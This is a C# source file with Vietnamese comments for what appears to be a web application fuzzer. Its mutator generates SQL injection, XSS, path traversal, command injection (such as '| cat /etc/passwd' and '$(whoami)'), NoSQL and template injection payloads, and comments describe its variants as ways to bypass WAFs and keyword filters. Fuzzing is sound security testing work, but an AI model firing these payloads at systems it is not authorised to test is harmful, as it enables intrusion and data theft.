using System.Text.RegularExpressions;

namespace WebFuzzer.Core.AFL;

/// <summary>
/// AFL-inspired Mutator cho web payloads.
/// 
/// V2: Nhận biết loại payload (XSS vs SQLi vs Generic) và áp dụng
/// chiến thuật đột biến phù hợp.
///
/// XSS payloads → Semantic mutations (CaseVariant, Encoding, WhitespaceInject...)
///   - Vì BitFlip trên "<script>" cho ra "<sQript>" → vô nghĩa
/// SQLi payloads → DictionaryInsert + Arithmetic (giữ nguyên)
/// Generic       → Full AFL strategy (BitFlip, ByteFlip, Arithmetic, Havoc)
/// </summary>
public sealed class Mutator
{
    private readonly Random _rng = new();

    // ── Phát hiện loại payload ────────────────────────────────────────────────

    private static readonly Regex _xssPattern = new(
        @"<[a-z]+[\s/>]|onerror\s*=|onload\s*=|javascript\s*:|alert\s*\(|<script|<svg|<img|<iframe|{{.*}}|\$\{|\#\{",
        RegexOptions.IgnoreCase | RegexOptions.Compiled, TimeSpan.FromMilliseconds(50));

    private static readonly Regex _sqliPattern = new(
        @"\bOR\b|\bAND\b|\bUNION\b|\bSELECT\b|\bSLEEP\b|\bWAITFOR\b|--\s*$|'.*'.*=|%27",
        RegexOptions.IgnoreCase | RegexOptions.Compiled, TimeSpan.FromMilliseconds(50));

    private bool IsXssPayload(string s)  { try { return _xssPattern.IsMatch(s); } catch { return false; } }
    private bool IsSqliPayload(string s) { try { return _sqliPattern.IsMatch(s); } catch { return false; } }

    // ── Dictionary tokens (vẫn dùng cho SQLi & DictionaryInsert) ─────────────
    private static readonly string[] DangerousTokens =
    [
        "'", "\"", "' OR 1=1--", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' UNION SELECT ", "1; DROP TABLE ", "'; WAITFOR DELAY '0:0:3'--",
        "' AND 1=1--", "' AND 1=2--", "' ORDER BY 1--",
        "1 OR 1=1", "admin'--", "') OR ('1'='1",
        "%27", "%22", "%00", "%0a", "%0d",
        "<script>", "</script>", "<img src=x onerror=alert(1)>",
        "javascript:", "onload=", "onerror=", "<svg/onload=alert(1)>",
        "\"><script>alert(1)</script>", "'-alert(1)-'",
        "../", "..\\ ", "....//", "%2e%2e%2f",
        "; ls", "| cat /etc/passwd", "$(whoami)", "`id`",
        "{\"$gt\":\"\"}", "{\"$ne\":\"\"}", "{\"$regex\":\".*\"}",
        "{{7*7}}", "${7*7}", "#{7*7}",
    ];

    // ── XSS Semantic Variants ─────────────────────────────────────────────────

    /// <summary>
    /// Case Variant: thay đổi chữ hoa/thường của tag/attribute để bypass WAF.
    /// <script> → <SCRIPT> → <Script> → <sCrIpT>
    /// </summary>
    private string XssCaseVariant(string seed)
    {
        int mode = _rng.Next(3);
        return mode switch
        {
            0 => seed.ToUpperInvariant(),
            1 => seed.ToLowerInvariant(),
            _ => new string(seed.Select((c, i) => i % 2 == 0 ? char.ToUpper(c) : char.ToLower(c)).ToArray())
        };
    }

    /// <summary>
    /// Encoding Variant: mã hóa ký tự đặc biệt để bypass filter chặn theo chữ.
    /// < → &lt; → &#60; → \u003c → %3C
    /// </summary>
    private string XssEncodingVariant(string seed)
    {
        int mode = _rng.Next(4);
        return mode switch
        {
            0 => seed.Replace("<", "&lt;").Replace(">", "&gt;"),
            1 => seed.Replace("<", "&#60;").Replace(">", "&#62;"),
            2 => seed.Replace("<", "\\u003c").Replace(">", "\\u003e"),
            _ => Uri.EscapeDataString(seed),
        };
    }

    /// <summary>
    /// Whitespace Inject: chèn khoảng trắng, tab, newline vào bên trong tag.
    /// Bypass WAF chặn theo keyword liền kề như "<script>" nhưng không chặn "<scr ipt>"
    /// <script> → <scr ipt> → <scr\tipt> → <scr\nipt>
    /// onerror= → onerror =
    /// </summary>
    private string XssWhitespaceInject(string seed)
    {
        // Chỉ inject vào trong tag name hoặc attribute name
        var tagMatch = Regex.Match(seed, @"<([a-zA-Z]{4,})", RegexOptions.IgnoreCase);
        if (tagMatch.Success)
        {
            var tagName = tagMatch.Groups[1].Value;
            if (tagName.Length >= 4)
            {
                int splitPos = _rng.Next(2, tagName.Length - 1);
                char[] ws = [' ', '\t', '\n', '\r'];
                var space = ws[_rng.Next(ws.Length)];
                var newTag = tagName[..splitPos] + space + tagName[splitPos..];
                return seed.Replace(tagMatch.Value, "<" + newTag, StringComparison.Ordinal);
            }
        }
        // Fallback: inject space trước dấu =
        return Regex.Replace(seed, @"(\w+)=", m => m.Groups[1].Value + " =", RegexOptions.IgnoreCase);
    }

    /// <summary>
    /// Handler Swap: đổi event handler sang handler khác cùng tác dụng.
    /// onerror= → onload= → onfocus= → onmouseover= → onpointerover=
    /// </summary>
    private string XssHandlerSwap(string seed)
    {
        string[] handlers = ["onerror=", "onload=", "onfocus=", "onmouseover=",
                              "onpointerover=", "onpointerenter=", "ontoggle=", "onanimationstart=",
                              "onscroll=", "onwheel=", "onclick=", "onkeydown="];
        foreach (var h in handlers)
        {
            if (seed.Contains(h, StringComparison.OrdinalIgnoreCase))
            {
                var replacement = handlers[_rng.Next(handlers.Length)];
                return Regex.Replace(seed, Regex.Escape(h), replacement, RegexOptions.IgnoreCase);
            }
        }
        return seed;
    }

    /// <summary>
    /// Quote Variant: thay đổi kiểu nháy trong JS expression.
    /// alert('1') → alert("1") → alert(`1`) → alert(1)
    /// </summary>
    private string XssQuoteVariant(string seed)
    {
        if (seed.Contains('\''))
            return _rng.Next(2) == 0 ? seed.Replace("'", "\"") : seed.Replace("'", "`");
        if (seed.Contains('"'))
            return _rng.Next(2) == 0 ? seed.Replace("\"", "'") : seed.Replace("\"", "`");
        return seed;
    }

    /// <summary>
    /// Comment Inject: chèn HTML comment vào giữa tag name để phá keyword filter.
    /// <script> → <scr<!--bypass-->ipt>
    /// </summary>
    private string XssCommentInject(string seed)
    {
        var match = Regex.Match(seed, @"<([a-zA-Z]{4,})", RegexOptions.IgnoreCase);
        if (!match.Success) return seed;
        var tagName = match.Groups[1].Value;
        if (tagName.Length < 4) return seed;
        int splitPos = _rng.Next(2, tagName.Length - 1);
        var injected = tagName[..splitPos] + "<!---->" + tagName[splitPos..];
        return seed.Replace(match.Value, "<" + injected, StringComparison.Ordinal);
    }

    /// <summary>
    /// Protocol Variant: biến thể chuỗi "javascript:" để bypass WAF.
    /// javascript: → Javascript: → JAVASCRIPT: → java\nscript: → java&#58;script:
    /// </summary>
    private string XssProtocolVariant(string seed)
    {
        if (!seed.Contains("javascript:", StringComparison.OrdinalIgnoreCase)) return seed;
        string[] variants = [
            "javascript:", "Javascript:", "JAVASCRIPT:",
            "java\nscript:", "java\tscript:", "java&#58;script:",
            "\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74:", // hex
        ];
        var chosen = variants[_rng.Next(variants.Length)];
        return Regex.Replace(seed, "javascript:", chosen, RegexOptions.IgnoreCase);
    }

    // ── Public API ────────────────────────────────────────────────────────────

    public List<CorpusEntry> Mutate(string seed, int energy, int generation)
    {
        var results = new List<CorpusEntry>();
        int nextGen = generation + 1;
        int baseCount = Math.Max(1, energy);

        if (IsXssPayload(seed))
        {
            // ── XSS: Semantic mutations — không dùng BitFlip/ByteFlip ──────
            results.AddRange(ApplyN(() => XssCaseVariant(seed),      2 * baseCount, nextGen, seed));
            results.AddRange(ApplyN(() => XssEncodingVariant(seed),  2 * baseCount, nextGen, seed));
            results.AddRange(ApplyN(() => XssWhitespaceInject(seed), 2 * baseCount, nextGen, seed));
            results.AddRange(ApplyN(() => XssHandlerSwap(seed),      2 * baseCount, nextGen, seed));
            results.AddRange(ApplyN(() => XssQuoteVariant(seed),     1 * baseCount, nextGen, seed));
            results.AddRange(ApplyN(() => XssCommentInject(seed),    1 * baseCount, nextGen, seed));
            results.AddRange(ApplyN(() => XssProtocolVariant(seed),  1 * baseCount, nextGen, seed));
            // Vẫn giữ DictionaryInsert nhưng chỉ prefix/append (không insert giữa)
            for (int i = 0; i < baseCount; i++)
            {
                var token = DangerousTokens[_rng.Next(DangerousTokens.Length)];
                results.Add(CreateEntry(_rng.Next(2) == 0 ? seed + token : token + seed, nextGen, seed));
            }
        }
        else if (IsSqliPayload(seed))
        {
            // ── SQLi: DictionaryInsert chủ lực + nhẹ binary ──────────────
            for (int i = 0; i < 3 * baseCount; i++) results.AddRange(ApplyN(() => DictionaryInsert(seed), 1, nextGen, seed));
            for (int i = 0; i < 1 * baseCount; i++) results.AddRange(ApplyN(() => ArithmeticMutation(seed), 1, nextGen, seed));
            for (int i = 0; i < 2 * baseCount; i++) results.AddRange(ApplyN(() => Havoc(seed), 1, nextGen, seed));
        }
        else
        {
            // ── Generic: Full AFL strategy ────────────────────────────────
            for (int i = 0; i < 3 * baseCount; i++) results.AddRange(ApplyN(() => DictionaryInsert(seed), 1, nextGen, seed));
            for (int i = 0; i < 1 * baseCount; i++) results.AddRange(ApplyN(() => BitFlip(seed),          1, nextGen, seed));
            for (int i = 0; i < 1 * baseCount; i++) results.AddRange(ApplyN(() => ByteFlip(seed),         1, nextGen, seed));
            for (int i = 0; i < 1 * baseCount; i++) results.AddRange(ApplyN(() => ArithmeticMutation(seed), 1, nextGen, seed));
            for (int i = 0; i < 2 * baseCount; i++) results.AddRange(ApplyN(() => Havoc(seed),            1, nextGen, seed));
        }

        return results
            .GroupBy(e => e.Payload)
            .Select(g => g.First())
            .ToList();
    }

    // ── Helper: apply + deduplicate ───────────────────────────────────────────

    private List<CorpusEntry> ApplyN(Func<string> mutFn, int n, int gen, string parent)
    {
        var list = new List<CorpusEntry>();
        for (int i = 0; i < n; i++)
        {
            try
            {
                var m = mutFn();
                if (m != parent) list.Add(CreateEntry(m, gen, parent));
            }
            catch { /* bỏ qua nếu mutate lỗi */ }
        }
        return list;
    }

    // ── Binary-level mutations (chỉ dùng cho Generic/SQLi) ───────────────────

    private string BitFlip(string seed)
    {
        if (string.IsNullOrEmpty(seed)) return seed;
        var bytes = System.Text.Encoding.UTF8.GetBytes(seed);
        int pos = _rng.Next(bytes.Length);
        bytes[pos] ^= (byte)(1 << _rng.Next(8));
        return System.Text.Encoding.UTF8.GetString(bytes);
    }

    private string ByteFlip(string seed)
    {
        if (string.IsNullOrEmpty(seed)) return seed;
        var bytes = System.Text.Encoding.UTF8.GetBytes(seed);
        byte[] interesting = [0x00, 0x0A, 0x0D, 0x20, 0x22, 0x27, 0x2F,
                               0x3C, 0x3E, 0x5C, 0x7B, 0x7D, 0x7F, 0xFF];
        bytes[_rng.Next(bytes.Length)] = interesting[_rng.Next(interesting.Length)];
        return System.Text.Encoding.UTF8.GetString(bytes);
    }

    private string ArithmeticMutation(string seed)
    {
        if (string.IsNullOrEmpty(seed)) return seed;
        var bytes = System.Text.Encoding.UTF8.GetBytes(seed);
        int pos = _rng.Next(bytes.Length);
        int delta = _rng.Next(1, 36) * (_rng.Next(2) == 0 ? 1 : -1);
        bytes[pos] = (byte)Math.Clamp(bytes[pos] + delta, 0, 255);
        return System.Text.Encoding.UTF8.GetString(bytes);
    }

    private string DictionaryInsert(string seed)
    {
        var token = DangerousTokens[_rng.Next(DangerousTokens.Length)];
        return _rng.Next(3) switch
        {
            0 => seed + token,
            1 => token + seed,
            _ => seed.Insert(_rng.Next(Math.Max(1, seed.Length)), token)
        };
    }


    /// <summary>
    /// Havoc: áp dụng 2–4 mutations ngẫu nhiên liên tiếp lên seed.
    /// Kết hợp nhiều chiến thuật — tạo biến thể phức tạp hơn.
    /// Giống AFL havoc stage.
    /// </summary>
    private string Havoc(string seed)
    {
        int rounds = _rng.Next(2, 5);
        var current = seed;
        for (int i = 0; i < rounds; i++)
        {
            current = _rng.Next(4) switch
            {
                0 => BitFlip(current),
                1 => ByteFlip(current),
                2 => ArithmeticMutation(current),
                _ => DictionaryInsert(current)
            };
        }
        return current;
    }

    // ── Helper ───────────────────────────────────────────────────────────────

    private static CorpusEntry CreateEntry(string payload, int generation, string parentPayload)
    {
        return new CorpusEntry
        {
            Payload = payload,
            MutationGeneration = generation,
            ParentPayload = parentPayload,
            Energy = 1
        };
    }
}
